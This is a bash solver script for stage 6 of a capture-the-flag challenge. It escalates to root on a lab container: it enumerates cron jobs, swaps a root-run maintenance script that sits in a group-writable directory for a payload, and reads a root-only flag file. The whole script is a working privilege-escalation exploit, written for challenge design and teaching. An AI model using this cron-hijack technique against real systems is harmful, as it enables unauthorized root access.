#!/usr/bin/env bash
#
# RaidTheRoot (RTR) - Stage 6 solver
# Owner: Member 3 (Challenge Design B)
#
# Self-developed privilege-escalation automation for "Find the Ghost".
# Run this ON the BANK-CORE-01 container, after logging in with the foothold
# credential recovered from the Stage 5 capture:
#
#     ssh svc_backup@127.0.0.1 -p 2222
#     bash solve.sh
#
# It walks the intended path: enumerate, find the writable-directory
# weakness, hijack the scheduled script, wait for cron, read the root file.

set -u

say()  { printf '\n\033[1;34m==>\033[0m %s\n' "$*"; }
info() { printf '    %s\n' "$*"; }

say "1. Who am I"
id

say "2. Anomalous local accounts"
# Service accounts no one documented are worth a second look.
grep -E 'svc_|ghost' /etc/passwd || info "none obvious"

say "3. Scheduled tasks"
info "/etc/cron.d:"
ls -la /etc/cron.d/
echo
cat /etc/cron.d/nexora-maintenance 2>/dev/null

say "4. The script the scheduler runs"
TARGET="/opt/nexora/maintenance/rotate_logs.sh"
ls -la "$TARGET"
info "owned by root, NOT writable by me - editing it directly won't work"

say "5. The directory that holds it"
ls -lad /opt/nexora/maintenance
info "the DIRECTORY is group-writable and I am in that group:"
groups
info "so I can rename the root-owned script aside and drop my own in its place"

say "6. Hijacking the scheduled task"
cat > /tmp/payload.sh <<'PAYLOAD'
#!/bin/bash
# runs as root via the maintenance schedule
cp /root/ghost_identity.txt /tmp/evidence.txt
chmod 644 /tmp/evidence.txt
PAYLOAD
chmod 755 /tmp/payload.sh

mv "$TARGET" /opt/nexora/maintenance/rotate_logs.sh.orig 2>/dev/null
cp /tmp/payload.sh "$TARGET"
info "payload staged as $TARGET - waiting for the next run (<= 60s)"

say "7. Waiting for cron"
for i in $(seq 1 75); do
    if [[ -f /tmp/evidence.txt ]]; then
        printf '\n'
        break
    fi
    printf '.'; sleep 1
done

say "8. Result"
if [[ -f /tmp/evidence.txt ]]; then
    cat /tmp/evidence.txt
    echo
    flag=$(grep -o 'RTR{[^}]*}' /tmp/evidence.txt)
    say "FLAG: $flag"
else
    info "evidence not produced - is cron running? check: pgrep cron"
fi
